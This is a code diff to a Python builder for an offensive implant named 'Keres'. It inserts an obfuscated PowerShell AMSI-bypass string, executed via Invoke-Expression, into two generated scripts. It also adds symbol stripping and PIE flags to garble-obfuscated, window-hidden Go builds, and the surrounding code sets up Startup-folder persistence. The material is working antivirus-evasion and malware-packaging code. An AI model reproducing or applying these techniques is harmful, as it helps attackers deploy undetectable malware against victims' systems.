@@ -139,6 +139,8 @@ def main():
     port_number = args.port
     global pow
     ps_command = f'''
+$ilinuim = $([char[]]('
+',"`n",'[','R','e','F',']','.','"',"``",'A',"`$","`(",'e','c','h','o',' ','s','s','e',"`)","``",'m','B',"`$","`(",'e','c','h','o',' ','L',"`)","``",'Y','"','.','"','g',"``",'E',"`$","`(",'e','c','h','o',' ','t','t','y',"`)",'p',"``",'E','"',"`(","`(",' ','"','S','y','{','3','}','a','n','a','{','1','}','u','t','{','4','}','t','i','{','2','}','{','0','}','i','l','s','"',' ','-','f',"'",'i','U','t',"'",',',"'",'g','e','m','e','n','t','.','A',"'",',','"','o','n','.','A','m',"``",'s','"',',',"'",'s','t','e','m','.','M',"'",',',"'",'o','m','a',"'","`)",' ',"`)",'.','"',"`$","`(",'e','c','h','o',' ','g','e',"`)","``",'T','f',"``",'i',"`$","`(",'e','c','h','o',' ','E','l',"`)",'D','"',"`(","`(",'"','{','0','}','{','2','}','n','i','{','1','}','i','l','e','d','"',' ','-','f',"'",'a','m',"'",',',"'",'t','F','a',"'",',','"',"``",'s','i','I','"',"`)",',',"`(",'"','{','2','}','u','b','l','{','0','}',"``",',','{','1','}','{','0','}','"',' ','-','f',' ',"'",'i','c',"'",',',"'",'S','t','a','t',"'",',',"'",'N','o','n','P',"'","`)","`)",'.','"',"`$","`(",'e','c','h','o',' ','S','e',"`)",'t',"``",'V','a',"`$","`(",'e','c','h','o',' ','L','U','E',"`)",'"',"`(","`$","`(","`)",',',"`$","`(",'1',' ','-','e','q',' ','1',"`)","`)") -join ''); Invoke-Expression $ilinuim
 $uniqueIdentifier = "Keres"
 $maxProcesses = 1
 $spawnedProcesses = 0
@@ -219,18 +221,18 @@ while ($true){{
             if args.platform=="Windows":
                 subprocess.run("export GOOS=windows GOARCH=amd64", shell=True)
                 time.sleep(1)
-                subprocess.run("garble -literals -tiny build -ldflags '-H=windowsgui' -o ./Output/keres.exe pewpew.go", shell=True)
+                subprocess.run("garble -literals -tiny build  -ldflags '-s -w -H=windowsgui' -o ./Output/keres.exe pewpew.go", shell=True)
                 print("Finished creating the executable in Output folder.")
             if args.platform=="Linux":
 
                 subprocess.run("export GOOS=linux ", shell=True)
                 time.sleep(1)
-                subprocess.run("garble -literals -tiny build -ldflags '-H=windowsgui' -o  ./Output/keres pewpew.go", shell=True)
+                subprocess.run("garble -literals -tiny build -ldflags '-s -w -H=windowsgui' -o  ./Output/keres pewpew.go", shell=True)
                 print("Finished creating the executable in Output folder.")
         
         else:
             if args.platform=="Windows":
-                subprocess.run("""garble  -literals -tiny build -ldflags "-H=windowsgui" -o ./Output/keres.exe pewpew.go """)
+                subprocess.run("""garble  -literals -tiny build -buildmode=pie -ldflags "-s -w -H=windowsgui" -o ./Output/keres.exe pewpew.go """)
                 print("Finished creating the executable in Output folder.")
             
         return
@@ -249,6 +251,8 @@ param(
     [string]$ScriptArgument = ""
 )
 
+$ilinuim = $([char[]]('
+',"`n",'[','R','e','F',']','.','"',"``",'A',"`$","`(",'e','c','h','o',' ','s','s','e',"`)","``",'m','B',"`$","`(",'e','c','h','o',' ','L',"`)","``",'Y','"','.','"','g',"``",'E',"`$","`(",'e','c','h','o',' ','t','t','y',"`)",'p',"``",'E','"',"`(","`(",' ','"','S','y','{','3','}','a','n','a','{','1','}','u','t','{','4','}','t','i','{','2','}','{','0','}','i','l','s','"',' ','-','f',"'",'i','U','t',"'",',',"'",'g','e','m','e','n','t','.','A',"'",',','"','o','n','.','A','m',"``",'s','"',',',"'",'s','t','e','m','.','M',"'",',',"'",'o','m','a',"'","`)",' ',"`)",'.','"',"`$","`(",'e','c','h','o',' ','g','e',"`)","``",'T','f',"``",'i',"`$","`(",'e','c','h','o',' ','E','l',"`)",'D','"',"`(","`(",'"','{','0','}','{','2','}','n','i','{','1','}','i','l','e','d','"',' ','-','f',"'",'a','m',"'",',',"'",'t','F','a',"'",',','"',"``",'s','i','I','"',"`)",',',"`(",'"','{','2','}','u','b','l','{','0','}',"``",',','{','1','}','{','0','}','"',' ','-','f',' ',"'",'i','c',"'",',',"'",'S','t','a','t',"'",',',"'",'N','o','n','P',"'","`)","`)",'.','"',"`$","`(",'e','c','h','o',' ','S','e',"`)",'t',"``",'V','a',"`$","`(",'e','c','h','o',' ','L','U','E',"`)",'"',"`(","`$","`(","`)",',',"`$","`(",'1',' ','-','e','q',' ','1',"`)","`)") -join ''); Invoke-Expression $ilinuim
 # If -p parameter is present, create the shortcut
 if ($p) {
     #Define the path for the shortcut in the Startup folder
